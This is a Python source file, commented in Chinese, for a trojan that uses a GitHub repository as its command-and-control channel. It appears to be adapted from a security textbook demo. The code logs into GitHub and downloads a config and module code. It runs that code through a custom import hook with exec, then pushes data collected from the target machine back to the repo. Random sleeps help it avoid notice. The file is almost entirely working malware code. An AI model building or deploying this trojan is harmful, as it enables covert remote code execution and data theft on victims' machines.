# coding: utf-8
''' 基于 GitHub 通信的木马

木马的主体框架，它从 GitHub 上下载配置选项和运行的模块代码
第一步是编写调用 GitHub API 所需的代码，来实现与 GitHub 的连接、认证和通信的功能
'''
import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os

from github3 import login

trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = queue.Queue()

# 这里的 GitHub 账号以及仓库配置可以用 yaml 文件读取或者自行做加密混淆
username = "xxxx"
password = "xxxx"
repository_name = "GitHubBlackHatDemo"
branch_name = "master"


def connect_to_github():
    ''' 用户认证

    获得当前的 repo 和 branch 的对象提供给其他函数使用
    '''
    gh = login(username=username, password=password)
    repo = gh.repository(username, repository_name)
    branch = repo.branch(branch_name)

    return gh, repo, branch


def get_file_contents(filepath):
    ''' 从远程的 repo 中抓取文件，然后将文件内容读取到本地变量中，在读取配置文件和模块的源代码时会用到
    '''
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            blob = repo.blob(filename._json_data['sha'])

            return blob.content

    return None


def get_trojan_config():
    ''' 获得 repo 中的远程配置文件，木马解析其中的内容获得需要运行的模块名称
    '''
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])

    return config


def store_module_result(data):
    ''' 将我们从目标机器上收集到的数据推送到 repo 中
    '''
    gh, repo, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data.encode()))

    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        ''' 尝试获得模块所在的位置

        调用了钱买你的远程文件加载器，如果在 repo 中能定位到所需的模块文件，则对其内容进行 base64 解密并将结果保存到 GitImport 类中
        通过返回 self 变量，告诉 Python 解析器找到了所需的模块
        '''
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library).decode()
                return self
        return None

    def load_module(self, name):
        ''' 调用 load_module 完成实际的加载过程。

        利用本地 imp 模块创建一个空的模块对象，然后将 GitHub 中获得的代码导入到这个对象中
        最后将新建的模块添加到 sys.modules 列表里面，这样之后代码就可以用 import 来调用这个模块了
        '''
        module = imp.new_module(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module

        return module


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # 保存结果到我们的 repo 中
    store_module_result(result)

    return


if __name__ == "__main__":
    ''' 木马主循环
    '''
    sys.meta_path = [GitImporter()]

    while True:
        if task_queue.empty():
            config = get_trojan_config()

            for task in config:
                t = threading.Thread(target=module_runner, args=(task['module'],))
                t.start()
                time.sleep(random.randint(1, 10))

        time.sleep(random.randint(1000, 10000))
